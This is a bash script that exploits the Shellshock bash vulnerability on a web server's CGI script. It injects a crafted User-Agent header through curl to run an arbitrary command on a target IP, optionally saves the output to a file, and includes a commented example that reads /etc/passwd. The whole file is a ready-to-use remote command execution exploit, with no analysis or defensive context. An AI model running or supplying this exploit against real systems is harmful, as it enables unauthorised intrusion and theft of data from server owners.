#!/bin/bash

if [[ $# -lt 3 ]] 
then
	echo "Usage: ./shellshock_mod_cgi_bash_exec.sh <IP_TARGET> <PATH_TO_CGI_SCRIPT> <COMMAND> <OUTPUT_FILE (optional)>"
	exit 1
fi
IP=$1
RPATH=$2
COMMAND=$3

#IP=192.168.154.17
#RPATH=/cgi-bin/hw.sh
#COMMAND="cat /etc/passwd"


if [ -z "$4" ]
then
	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '$COMMAND'" http://$IP$RPATH
else
	OUTPUT_FILE=${4}
	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c '$COMMAND'" http://$IP$RPATH >> $OUTPUT_FILE
fi

